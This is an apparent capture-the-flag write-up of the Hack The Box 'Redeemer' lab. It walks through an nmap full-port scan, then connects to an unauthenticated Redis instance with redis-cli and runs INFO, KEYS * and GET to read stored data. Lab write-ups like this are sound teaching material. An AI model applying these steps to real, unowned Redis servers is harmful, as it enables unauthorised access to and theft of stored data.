# HTB — Redeemer

**Difficulty:** Very Easy  
**Category:** Starting Point  
**Tags:** Redis, Linux

---

## Overview

Redeemer is a very easy Starting Point machine focused on Redis, an in-memory data store commonly used for caching, sessions, and message queuing. The goal is to connect to an exposed Redis instance and extract data directly from it.

---

## Enumeration

### Step 01 — Port scan the target

Redis runs on port 6379 by default. Use `-p-` to scan all ports as it may not show in the default top-1000 scan.

```bash
nmap -sV -p- <target-ip>
```

```
6379/tcp open  redis  Redis key-value store
```

Port 6379 is open with no authentication required, apparently a common misconfiguration. Redis is designed to be fast and lightweight, and authentication is often left disabled in development or internal environments that accidentally get exposed.

---

## Foothold

### Step 02 — Connect to Redis

Use `redis-cli` to connect directly. No password needed.

```bash
redis-cli -h <target-ip>
```

### Step 03 — Gather information about the instance

The `INFO` command dumps everything about the Redis server: version, memory usage, connected clients, and more.

```
<target-ip>:6379> INFO
```

```
# Server
redis_version:5.0.7
os:Linux 5.4.0 x86_64
...
```

### Step 04 — List all keys in the database

Redis stores everything as key-value pairs. `KEYS *` lists all of them.

```
<target-ip>:6379> KEYS *
```

```
1) "flag"
2) "numb"
3) "stor"
4) "temp"
```

### Step 05 — Read the flag

```
<target-ip>:6379> GET flag
```

---

## What I Learned

- Redis is an in-memory key-value store that runs on port 6379 by default
- Redis instances are often left without authentication, making them easy targets when exposed
- Use `-p-` with nmap to scan all 65535 ports (services like Redis won't show in the default top-1000 scan)
- `redis-cli -h` connects to a remote Redis instance
- `INFO` dumps server metadata; `KEYS *` lists all stored keys; `GET` retrieves a value
- In a real environment, Redis should always require authentication and never be exposed to the internet
